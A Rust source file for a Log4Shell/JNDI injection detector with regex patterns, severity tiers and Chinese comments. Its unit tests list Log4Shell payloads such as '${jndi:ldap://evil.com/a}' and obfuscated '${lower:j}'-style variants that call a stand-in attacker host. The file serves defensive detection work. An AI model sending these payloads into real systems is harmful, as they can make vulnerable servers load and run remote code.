// Copyright (c) 2026 erik <erik@erik.xyz> — https://erik.xyz

use crate::{AttackCategory, DetectionResult, Detector, Severity, regex_detect};
use regex::Regex;
use std::sync::LazyLock;

/// 强信号：`jndi:` 查找本体，以及只为混淆它而存在的展开写法。
/// 正常内容里没有「`${jndi:` 后面跟一个查找目标」这种形状。
/// 4 条分支合并成 1 条 alternation —— `regex_detect` 对列表里每条 `Regex` 各跑一次
/// `find`，干净输入下 4 次全文扫描变 1 次。分支顺序 = 原 vec 顺序（同一位置上取最左
/// 分支；与「按列表顺序取第一条命中的模式」相比偏移量可能不同，档位不变）。
/// 各分支共同的 `(?i)` 提升为外层 `(?i:…)`，作用域正好覆盖全部 4 条分支。
static STRONG_PATTERNS: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(concat!(
        // 字面量 `${jndi:`（后随 `:`，不是 `${jndi` 这个前缀）
        r"(?i:\$\{jndi:",
        // `${lower:j}` / `${upper:j}` / `${::-j}`：单字符大小写折叠与前缀折叠，
        // 只有「拼出 jndi」这一个用途
        r"|\$\{lower:j\}",
        r"|\$\{upper:j\}",
        r"|\$\{::-j\})",
    ))
    .unwrap()
});

/// 弱信号：`${env:` / `${sys:` / `${java:` 是 log4j2 的**合法** lookup 语法 ——
/// 它们出现在 log4j2.xml 里（`${env:LOG_DIR}`）、出现在讲 log4j2 配置的文档里，
/// 也确实是攻击者用来读环境变量的载体。两种形态字节相同，正则分不开，所以报
/// Low 而不是 Critical：单条不足以触发拒绝，聚合分交给调用方。
///
/// 本库的 `log4shell.rs:181` 已经把它们当正常内容（`"${env:JAVA_HOME} 读取环境变量"`
/// 是 `assert_clean` 的用例，整条 `ignores_benign_inputs` 走真实 `Scanner` 路径也
/// 全在拒绝线下），这里再判 Critical 是自相矛盾。
/// 3 条分支合并成 1 条 alternation —— `regex_detect` 对列表里每条 `Regex` 各跑一次
/// `find`，干净输入下 3 次全文扫描变 1 次。分支顺序 = 原 vec 顺序（同一位置上取最左
/// 分支；与「按列表顺序取第一条命中的模式」相比偏移量可能不同，档位不变）。
/// 各分支共同的 `(?i)` 提升为外层 `(?i:…)`，作用域正好覆盖全部 3 条分支。
static WEAK_PATTERNS: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(concat!(
        r"(?i:\$\{env:",
        r"|\$\{sys:",
        r"|\$\{java:)",
    ))
    .unwrap()
});

pub struct JndiInjectionDetector;

impl Detector for JndiInjectionDetector {
    fn name(&self) -> &'static str {
        "jndi_injection"
    }

    fn detect(&self, input: &str) -> Option<DetectionResult> {
        regex_detect(
            std::slice::from_ref(&*STRONG_PATTERNS),
            self.name(),
            AttackCategory::Injection,
            Severity::Critical,
            "JNDI/Log4Shell injection detected",
            input,
        )
        .or_else(|| {
            regex_detect(
                std::slice::from_ref(&*WEAK_PATTERNS),
                self.name(),
                AttackCategory::Injection,
                Severity::Low,
                "log4j lookup syntax present (weak signal)",
                input,
            )
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn det() -> JndiInjectionDetector {
        JndiInjectionDetector
    }

    fn assert_hit(input: &str) {
        crate::test_helpers::assert_detected(
            &det(),
            input,
            AttackCategory::Injection,
            Severity::Critical,
        );
    }

    fn assert_low(input: &str) {
        crate::test_helpers::assert_detected(
            &det(),
            input,
            AttackCategory::Injection,
            Severity::Low,
        );
    }

    #[test]
    fn name_is_jndi_injection() {
        assert_eq!(det().name(), "jndi_injection");
    }

    #[test]
    fn detects_common_payloads() {
        for input in [
            "${jndi:ldap://evil.com/a}",
            "${lower:j}ndi:ldap://evil.com/a}",
            "${upper:j}NDI:rmi://evil.com}",
            "${::-j}ndi:dns://evil.com}",
        ] {
            assert_hit(input);
        }
    }

    /// `${env:` / `${sys:` / `${java:` 是 log4j2 的合法 lookup 语法，也是攻击载体 ——
    /// 两种形态字节相同，所以报 Low：仍然检出，但不单独越过拒绝线。
    /// 顺带一提，`log4shell.rs` 早已把 `${env:JAVA_HOME}` 当正常内容。
    #[test]
    fn lookup_only_tokens_are_low_not_critical() {
        for input in [
            // 攻击侧：只用单个 lookup 探环境变量
            "${env:JNDI_LOOKUP}",
            "${sys:java.version}",
            "${java:os.name}",
            // 正常侧：log4j2 配置文件的合法占位符
            r#"<Property name="logDir">${env:LOG_DIR}</Property>"#,
            r#"<Property name="user">${sys:user.home}</Property>"#,
        ] {
            assert_low(input);
        }
    }

    #[test]
    fn benign_inputs_not_detected() {
        for input in [
            "Hello, this is a normal text input. Nothing suspicious here.",
            "The jndi lookup service is running",
            "Please set the JAVA_HOME env variable",
            "log4j is a logging library",
        ] {
            assert!(det().detect(input).is_none(), "false positive: {input}");
        }
    }

    #[test]
    fn edge_cases() {
        assert!(det().detect("").is_none());
        assert!(det().detect(" \t\n ").is_none());
        assert!(det().detect("你好世界 こんにちは").is_none());
        // near misses: missing ${ prefix or missing colon
        assert!(det().detect("jndi:ldap://evil.com/a").is_none());
        assert!(det().detect("${jndi").is_none());
        assert!(det().detect("${jndildap://evil.com}").is_none());
    }

    #[test]
    fn obfuscated_variants_detected() {
        for input in ["${JNDI:ldap://evil.com/a}", "${LoWeR:j}ndi:ldap://evil.com}"] {
            assert_hit(input);
        }
    }

    /// 大小写变体不改变分档：`${env:…}` 的编码变体也是弱信号。
    #[test]
    fn obfuscated_lookup_only_token_is_still_low() {
        assert_low("${ENV:LOG4J_FORMAT_MSG_NO_LOOKUPS}");
    }
}
